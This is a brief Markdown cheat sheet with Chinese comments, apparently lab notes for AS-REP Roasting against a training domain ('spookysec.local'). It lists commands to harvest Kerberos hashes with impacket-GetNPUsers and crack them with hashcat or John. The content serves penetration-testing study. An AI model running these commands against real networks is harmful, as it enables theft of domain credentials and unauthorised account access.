# impacket-GetNPUsers

## cmd
```bash
# Step 1: 創建用戶列表(去除重複和@域名部分)
cat > users.txt << EOF
james
svc-admin
robin
darkstar
administrator
backup
EOF

# Step 2: 執行 AS-REP Roasting
impacket-GetNPUsers spookysec.local/ -usersfile users.txt -dc-ip 10.10.129.69 -format hashcat -outputfile hashes.txt

# Step 3: 查看結果
cat hashes.txt

# Step 4: 如果有 hash,用 hashcat 破解
hashcat -m 18200 hashes.txt passwordlist.txt --force

# 或使用 john
john --wordlist=passwordlist.txt hashes.txt
```